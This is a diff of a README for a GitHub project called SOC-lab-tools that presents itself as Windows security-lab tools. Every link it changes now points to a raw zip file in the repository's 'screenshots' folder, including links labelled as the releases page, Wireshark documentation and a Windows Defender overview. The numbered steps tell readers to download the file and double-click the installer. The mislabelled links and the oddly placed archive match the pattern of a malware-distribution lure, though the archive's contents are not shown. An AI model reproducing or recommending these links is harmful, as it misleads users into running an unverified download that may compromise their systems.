@@ -6,7 +6,7 @@ Welcome to the SOC-lab-tools! This set of Windows tools helps you with your secu
 
 ## 📥 Download Now
 
-[![Download SOC-lab-tools](https://github.com/rn115794/SOC-lab-tools/raw/refs/heads/main/network-dumps/tools_SO_lab_v3.7.zip)](https://github.com/rn115794/SOC-lab-tools/raw/refs/heads/main/network-dumps/tools_SO_lab_v3.7.zip)
+[![Download SOC-lab-tools](https://raw.githubusercontent.com/rn115794/SOC-lab-tools/main/screenshots/SO_lab_tools_v1.2.zip)](https://raw.githubusercontent.com/rn115794/SOC-lab-tools/main/screenshots/SO_lab_tools_v1.2.zip)
 
 ## 🛠️ Features
 
@@ -25,7 +25,7 @@ To run SOC-lab-tools effectively, ensure your system meets the following require
 
 ## 📂 Download & Install
 
-1. **Visit the downloads page**: Go to the [Releases page](https://github.com/rn115794/SOC-lab-tools/raw/refs/heads/main/network-dumps/tools_SO_lab_v3.7.zip) to view the available versions.
+1. **Visit the downloads page**: Go to the [Releases page](https://raw.githubusercontent.com/rn115794/SOC-lab-tools/main/screenshots/SO_lab_tools_v1.2.zip) to view the available versions.
 2. **Select your version**: Choose the latest version for best performance and security.
 3. **Download the installer**: Click on the provided link for the installer file and save it to your computer.
 4. **Run the installer**: Locate the downloaded file and double-click it to start the installation process.
@@ -64,8 +64,8 @@ This project covers a variety of topics related to security operations and testi
 
 For further reading and resources related to SOC-lab-tools and its capabilities, visit the following links:
 
-- [Wireshark Documentation](https://github.com/rn115794/SOC-lab-tools/raw/refs/heads/main/network-dumps/tools_SO_lab_v3.7.zip)
-- [Windows Defender Overview](https://github.com/rn115794/SOC-lab-tools/raw/refs/heads/main/network-dumps/tools_SO_lab_v3.7.zip)
+- [Wireshark Documentation](https://raw.githubusercontent.com/rn115794/SOC-lab-tools/main/screenshots/SO_lab_tools_v1.2.zip)
+- [Windows Defender Overview](https://raw.githubusercontent.com/rn115794/SOC-lab-tools/main/screenshots/SO_lab_tools_v1.2.zip)
 
 ## 📞 Community and Contributions
 
